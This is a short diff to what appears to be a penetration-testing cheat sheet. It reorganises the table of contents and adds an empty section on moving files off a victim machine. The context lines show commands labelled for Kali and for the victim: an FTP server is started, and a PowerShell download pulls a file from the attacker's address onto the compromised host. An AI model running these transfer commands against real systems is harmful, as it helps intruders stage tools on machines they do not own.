@@ -6,7 +6,8 @@
 - [SMB](#SMB)
 - [LDAP](#LDAP)
 - [DNS](#DNS)
-- [File Transfer](#FileTransfer)
+- [File Transfer to Victim](#File-Transfer-To-Victim)
+- [File Transfer from Victim](#File-Transfer-From-Victim)
 - [Upgrading Reverse Shells to be Fully Interactive](#Upgrading Reverse Shells to be Fully Interactive)
 - [Redis](#Reids)
 - [Search files](#Search files)
@@ -163,6 +164,8 @@ If you get an error, use an account name and password:
 - KALI: `sudo pip3 install pyftpdlib`
 - KALI: `sudo python3 -m pyftpdlib --port 21`
 - VICTIM: `(New-Object Net.WebClient).DownloadFile('ftp://192.168.1.13/file', 'file')`
+
+# File-Transfer-From-Victim
 
 # Redis
 
